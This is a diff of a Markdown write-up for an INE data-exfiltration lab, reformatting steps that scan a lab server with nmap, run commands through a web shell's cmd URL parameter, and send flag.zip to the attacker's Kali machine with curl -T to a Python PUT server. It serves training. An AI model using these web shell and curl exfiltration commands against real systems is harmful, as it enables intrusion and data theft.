@@ -37,9 +37,13 @@ The Kali OS GUI instance is web hosted on the INE website, where:
 
 - The web server IP is `192.70.33.3` 
 
+### nmap
+
 - Perform an `nmap` scan to check open ports on the server:
 
-  - *Simple scan*: **`sudo nmap demo.ine.local`**
+  - *Simple scan*:
+
+    **`sudo nmap demo.ine.local`**
 
   ```shell
   root@INE:~# sudo nmap demo.ine.local
@@ -54,7 +58,10 @@ The Kali OS GUI instance is web hosted on the INE website, where:
   Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
   ```
 
-  - *Advanced scan*: **`sudo nmap -sC -sV -oA nmap/dataexfiltration 192.70.33.3`**
+  - *Advanced scan*:
+    
+    **`sudo nmap -sC -sV -oA nmap/dataexfiltration 192.70.33.3`**
+    
     - **`-sC`** - for default scripts
     - **`-sV`** - probe open ports to determine service/versions info
     - **`-oA`** - output all 3 major formats in a directory
@@ -81,15 +88,16 @@ The Kali OS GUI instance is web hosted on the INE website, where:
 
 ![](.gitbook/assets/image-20220505111539250.png)
 
-- Pass a parameter named `cmd` with the URL, using `?cmd=VALUE` in the URL:
+### Web shell commands
 
+- Pass a parameter named `cmd` with the URL, using `?cmd=VALUE` in the URL:
   - **`http://demo.ine.local:8000/?cmd=pwd`**
 
-  ![](.gitbook/assets/image-20220505120650948.png)
+![](.gitbook/assets/image-20220505120650948.png)
 
   - **`http://demo.ine.local:8000/?cmd=ls+-l`** - check contents of pwd:
 
-  ![](.gitbook/assets/image-20220505120905753.png)
+![](.gitbook/assets/image-20220505120905753.png)
 
 - *flag.zip* file must be transferred to the Kali instance.
 
@@ -97,7 +105,7 @@ The Kali OS GUI instance is web hosted on the INE website, where:
 
   - **`http://demo.ine.local:8000/?cmd=curl+-h`** - curl is present:
 
-  ![](.gitbook/assets/image-20220505121245432.png)
+![](.gitbook/assets/image-20220505121245432.png)
 
   - `curl` can be used to exfiltrate the flag.zip file by sending it over HTTP protocol to a local HTTP server on the Kali instance, using the **`-T`** option:
 
@@ -110,20 +118,20 @@ The Kali OS GUI instance is web hosted on the INE website, where:
   >               ation to fail. If this is used on an HTTP(S) server, the PUT command will be
   >               used.
 
-- Run a HTTP server on the local machine using python:
+### Python HTTP server
 
+- Run a HTTP server on the local machine using python:
   - **`python -m SimpleHTTPServer 80`**
 
   - The Kali instance IP is `192.70.33.2`
 
   - `http://demo.ine.local:8000/?cmd=curl+192.70.33.2+-T+flag.zip`
+  - *Error response - Unsupported method ('PUT')*
 
-    - *Error response - Unsupported method ('PUT')*
+![](.gitbook/assets/image-20220505125425734.png)
 
-    ![](.gitbook/assets/image-20220505125425734.png)
-
-  - (Same error with **`python3 -m http.server 80`**)
-  - Create a Python script to run an *HTTP server supporting PUT*.
+- (Same error with **`python3 -m http.server 80`**)
+- Create a Python script to run an *HTTP server supporting PUT*.
 
   ```shell
   root@INE:~# which python
@@ -156,22 +164,23 @@ The Kali OS GUI instance is web hosted on the INE website, where:
 
   - Run the SimpleHTTP server using the script:
     - **`python httpserver.py 80`**
-  - Try again the PUT request - `http://demo.ine.local:8000/?cmd=curl+192.70.33.2+-T+flag.zip`
+  - Try again the PUT request
+    `http://demo.ine.local:8000/?cmd=curl+192.70.33.2+-T+flag.zip`
     - Archive flag.zip was received by the server.
 
-  ![](.gitbook/assets/image-20220505130449931.png)
+![](.gitbook/assets/image-20220505130449931.png)
 
 - Stop the running HTTP server and check the folder for the downloaded file.
 
   - **`ls -l`**
 
-  ![](.gitbook/assets/image-20220505131132654.png)
+![](.gitbook/assets/image-20220505131132654.png)
 
 - Unzip the archive and retrieve the flag:
 
   - **`unzip flag.zip`**
   - **`cat flag/flag.txt`**
 
-  ![](.gitbook/assets/image-20220505131635395.png)
+![](.gitbook/assets/image-20220505131635395.png)
 
 > 📍 Lab solved!
